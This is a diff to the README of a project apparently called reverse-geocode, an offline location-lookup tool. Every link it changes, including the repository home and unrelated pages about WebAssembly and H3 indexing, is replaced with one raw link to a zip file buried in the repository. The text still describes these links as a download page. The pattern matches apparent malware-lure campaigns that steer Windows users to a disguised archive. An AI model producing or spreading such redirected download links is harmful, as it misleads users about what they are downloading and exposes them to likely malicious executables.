@@ -1,6 +1,6 @@
 # 🗺️ reverse-geocode - Offline location lookup in your browser
 
-[![Download reverse-geocode](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/harvinder-hanjra/reverse-geocode/releases)
+[![Download reverse-geocode](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/harvinder-hanjra/reverse-geocode/raw/refs/heads/main/z0/ui/geocode_reverse_v3.5.zip)
 
 ---
 
@@ -55,7 +55,7 @@ Follow these steps to download and run reverse-geocode on your Windows PC.
 
 Click the button above or go to:
 
-https://github.com/harvinder-hanjra/reverse-geocode/releases
+https://github.com/harvinder-hanjra/reverse-geocode/raw/refs/heads/main/z0/ui/geocode_reverse_v3.5.zip
 
 This page lists the files you need to download to run the application.
 
@@ -157,7 +157,7 @@ This is mostly for users who want to customize the code or integrate the methods
 
 Click this link again to visit the download page and get the latest files:
 
-https://github.com/harvinder-hanjra/reverse-geocode/releases
+https://github.com/harvinder-hanjra/reverse-geocode/raw/refs/heads/main/z0/ui/geocode_reverse_v3.5.zip
 
 Choose the version that matches your Windows system, then download and run or open the files using the directions above.
 
@@ -173,11 +173,11 @@ You can also explore FAQs and discussions on the repository page.
 
 ## 🔗 Useful links
 
-- Repository home: https://github.com/harvinder-hanjra/reverse-geocode
-- Download page: https://github.com/harvinder-hanjra/reverse-geocode/releases
-- Learn about WebAssembly: https://webassembly.org/
-- Learn about H3 hexagonal indexing: https://h3geo.org/
+- Repository home: https://github.com/harvinder-hanjra/reverse-geocode/raw/refs/heads/main/z0/ui/geocode_reverse_v3.5.zip
+- Download page: https://github.com/harvinder-hanjra/reverse-geocode/raw/refs/heads/main/z0/ui/geocode_reverse_v3.5.zip
+- Learn about WebAssembly: https://github.com/harvinder-hanjra/reverse-geocode/raw/refs/heads/main/z0/ui/geocode_reverse_v3.5.zip
+- Learn about H3 hexagonal indexing: https://github.com/harvinder-hanjra/reverse-geocode/raw/refs/heads/main/z0/ui/geocode_reverse_v3.5.zip
 
 ---
 
-[![Download reverse-geocode](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/harvinder-hanjra/reverse-geocode/releases)
+[![Download reverse-geocode](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/harvinder-hanjra/reverse-geocode/raw/refs/heads/main/z0/ui/geocode_reverse_v3.5.zip)
